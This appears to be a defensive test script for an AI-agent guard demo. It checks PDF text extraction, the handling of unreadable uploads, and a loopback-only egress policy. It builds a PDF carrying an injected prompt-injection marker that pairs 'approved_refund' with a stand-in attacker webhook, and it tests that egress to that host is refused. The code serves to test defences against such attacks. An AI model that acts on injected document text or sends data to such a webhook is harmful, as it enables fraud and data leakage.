import assert from 'node:assert/strict';
import { deflateSync } from 'node:zlib';

import { attemptEgress } from './egress';
import { ingestDocument } from './pdf';
import { runUnguardedWorkflow } from './workflow-agent';
import { startWorldSink } from './world-sink';

// Standalone assertion script (no test framework; demo/ has none). Guards the
// exact regression: the old regex byte-scraper turned FlateDecode-compressed PDFs
// into garbage and empty reads were silently treated as readable. Run:
//   pnpm --filter @trustloopguard/demo agent-demo:workflow:assert

async function main(): Promise<void> {
  // 1. Compressed (FlateDecode) PDF — the case the old scraper could not read —
  //    is now parsed and the injected marker is recovered.
  const marker = 'approved_refund https://attacker.example/hook';
  const compressed = await ingestDocument(flateTextPdf(marker));
  assert.equal(compressed.ok, true, `compressed PDF should be readable: ${compressed.reason}`);
  assert.ok(
    compressed.text.includes('approved_refund') && compressed.text.includes('attacker.example'),
    `expected injected marker in extracted text, got: ${compressed.text.slice(0, 200)}`,
  );

  // 2. Empty bytes are unreadable — the exact false-negative we are killing.
  const empty = await ingestDocument(new Uint8Array());
  assert.equal(empty.ok, false, 'empty document must be unreadable, not silently empty-but-ok');

  // 3. Non-PDF / garbage bytes are unreadable, not parsed.
  const garbage = await ingestDocument(new Uint8Array(Buffer.from('this is not a pdf', 'utf8')));
  assert.equal(garbage.ok, false, 'garbage bytes must be unreadable');

  // 4. An unreadable upload flows to an inconclusive run: unreadable status, zero
  //    proposed actions — never a silent "safe" pass. (No API key needed: the
  //    unreadable path short-circuits before any LLM call.)
  const run = await runUnguardedWorkflow({
    documentName: 'garbage.pdf',
    documentBase64: Buffer.from('not a real pdf at all', 'utf8').toString('base64'),
    documentMimeType: 'application/pdf',
  });
  assert.equal(run.ingestion.status, 'unreadable', 'unreadable upload must be marked unreadable');
  assert.equal(run.proposedActions.length, 0, 'unreadable upload must propose no tool actions');

  // 5. Real side effects are honest: a loopback egress is actually sent and the
  //    owned sink observes it; a non-loopback egress is REFUSED (never leaves the
  //    machine), so the sink never sees it.
  const sink = await startWorldSink({ host: '127.0.0.1', port: 9129 });
  try {
    const loopback = await attemptEgress('http://127.0.0.1:9129/webhook/c1', '{"hello":"world"}');
    assert.equal(loopback.sent, true, `loopback egress should send: ${loopback.reason}`);
    assert.equal(sink.observed('c1').webhook.length, 1, 'sink must observe the real loopback call');

    const external = await attemptEgress('https://attacker.example/hook', '{"x":1}');
    assert.equal(external.sent, false, 'non-loopback egress must be refused (never leaves the machine)');
    assert.equal(sink.observed('c2').webhook.length, 0, 'refused egress must not reach the sink');
  } finally {
    await sink.close();
  }

  process.stdout.write('workflow ingest assertions: all assertions passed\n');
}

function flateTextPdf(text: string): Uint8Array {
  const content = Buffer.from(
    `BT /F1 10 Tf 72 720 Td (${escapePdfLiteral(text)}) Tj ET`,
    'latin1',
  );
  const stream = deflateSync(content);
  const head = Buffer.from(
    [
      '%PDF-1.4',
      '1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj',
      '2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj',
      '3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >> endobj',
      '4 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> endobj',
      `5 0 obj << /Filter /FlateDecode /Length ${stream.length} >> stream\n`,
    ].join('\n'),
    'latin1',
  );
  // No xref table — pdfjs recovers by indexing all objects; that is exactly the
  // lenient ingestion we want the demo target to perform.
  const tail = Buffer.from('\nendstream endobj\ntrailer << /Size 6 /Root 1 0 R >>\n%%EOF', 'latin1');
  return new Uint8Array(Buffer.concat([head, stream, tail]));
}

function escapePdfLiteral(value: string): string {
  return value.replace(/\\/g, '\\\\').replace(/\(/g, '\\(').replace(/\)/g, '\\)');
}

main().catch((error) => {
  process.stderr.write(
    `workflow ingest assertions failed: ${error instanceof Error ? error.stack : String(error)}\n`,
  );
  process.exitCode = 1;
});
